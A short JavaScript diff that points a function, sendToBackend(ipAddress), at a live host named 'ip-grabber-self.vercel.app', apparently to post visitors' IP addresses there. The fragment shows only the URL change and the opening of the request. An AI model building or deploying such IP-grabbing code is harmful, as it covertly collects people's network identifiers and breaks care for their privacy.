@@ -1,5 +1,5 @@
 function sendToBackend(ipAddress) {
-    const backendURL = 'https://your-vercel-project-url.vercel.app/api/send-ip';  // Remplace par l'URL Vercel
+    const backendURL = 'https://ip-grabber-self.vercel.app/';
 
     const xhr = new XMLHttpRequest();
     xhr.open('POST', backendURL, true);
